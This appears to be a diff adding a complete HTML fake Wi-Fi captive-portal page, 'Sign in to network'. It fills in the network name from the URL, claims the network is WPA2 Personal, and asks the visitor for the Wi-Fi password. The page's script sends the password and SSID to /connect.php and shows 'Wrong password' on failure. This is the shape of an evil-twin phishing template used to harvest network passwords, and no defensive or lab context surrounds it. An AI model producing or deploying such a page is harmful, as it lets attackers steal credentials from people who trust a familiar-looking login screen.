@@ -1,0 +1,224 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in to network</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Roboto', sans-serif;
+        }
+        
+        body {
+            background: #f5f5f5;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+        
+        .header {
+            background: #1a73e8;
+            color: white;
+            padding: 20px;
+            text-align: center;
+        }
+        
+        .header h1 {
+            font-size: 20px;
+            font-weight: 500;
+        }
+        
+        .container {
+            flex: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        
+        .login-card {
+            background: white;
+            border-radius: 8px;
+            padding: 24px;
+            width: 100%;
+            max-width: 360px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.12), 0 1px 2px rgba(0,0,0,0.24);
+        }
+        
+        .wifi-icon {
+            text-align: center;
+            font-size: 48px;
+            margin-bottom: 16px;
+        }
+        
+        .network-info {
+            text-align: center;
+            margin-bottom: 24px;
+        }
+        
+        .network-name {
+            font-size: 18px;
+            color: #202124;
+            font-weight: 500;
+            margin-bottom: 8px;
+        }
+        
+        .network-type {
+            font-size: 14px;
+            color: #5f6368;
+        }
+        
+        .input-group {
+            margin-bottom: 16px;
+        }
+        
+        .input-group label {
+            display: block;
+            font-size: 14px;
+            color: #5f6368;
+            margin-bottom: 8px;
+        }
+        
+        .input-group input {
+            width: 100%;
+            padding: 12px 16px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-size: 16px;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+        
+        .input-group input:focus {
+            border-color: #1a73e8;
+            border-width: 2px;
+        }
+        
+        .options {
+            display: flex;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+        
+        .options label {
+            font-size: 14px;
+            color: #5f6368;
+            margin-left: 8px;
+        }
+        
+        .login-btn {
+            width: 100%;
+            padding: 12px;
+            background: #1a73e8;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            text-transform: uppercase;
+        }
+        
+        .login-btn:hover {
+            background: #1557b0;
+        }
+        
+        .error-msg {
+            color: #d93025;
+            font-size: 14px;
+            text-align: center;
+            margin-top: 12px;
+            display: none;
+        }
+        
+        .error-msg.show {
+            display: block;
+        }
+        
+        .footer {
+            text-align: center;
+            padding: 16px;
+            font-size: 12px;
+            color: #5f6368;
+        }
+        
+        .footer a {
+            color: #1a73e8;
+            text-decoration: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <h1>Sign in to network</h1>
+    </div>
+    
+    <div class="container">
+        <div class="login-card">
+            <div class="wifi-icon">📶</div>
+            
+            <div class="network-info">
+                <div class="network-name" id="ssid">Wi-Fi Network</div>
+                <div class="network-type">WPA2 Personal</div>
+            </div>
+            
+            <form id="loginForm" method="POST" action="/connect.php">
+                <div class="input-group">
+                    <label for="password">Password</label>
+                    <input type="password" name="password" id="password" placeholder="Enter password" required autocomplete="current-password">
+                </div>
+                
+                <div class="options">
+                    <input type="checkbox" id="showPassword">
+                    <label for="showPassword">Show password</label>
+                </div>
+                
+                <button type="submit" class="login-btn">Connect</button>
+                
+                <div class="error-msg" id="errorMsg">Wrong password. Try again.</div>
+            </form>
+        </div>
+    </div>
+    
+    <div class="footer">
+        <p>By connecting, you agree to the <a href="#">terms of service</a></p>
+    </div>
+
+    <script>
+        document.getElementById('showPassword').addEventListener('change', function() {
+            const passwordInput = document.getElementById('password');
+            passwordInput.type = this.checked ? 'text' : 'password';
+        });
+        
+        // Get SSID from URL if provided
+        const urlParams = new URLSearchParams(window.location.search);
+        const ssid = urlParams.get('ssid') || 'Wi-Fi Network';
+        document.getElementById('ssid').textContent = ssid;
+        
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const password = document.getElementById('password').value;
+            
+            fetch('/connect.php', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+                body: 'password=' + encodeURIComponent(password) + '&ssid=' + encodeURIComponent(ssid)
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.success) {
+                    window.location.href = '/success.html';
+                } else {
+                    document.getElementById('errorMsg').classList.add('show');
+                }
+            })
+            .catch(() => {
+                document.getElementById('errorMsg').classList.add('show');
+            });
+        });
+    </script>
+</body>
+</html>
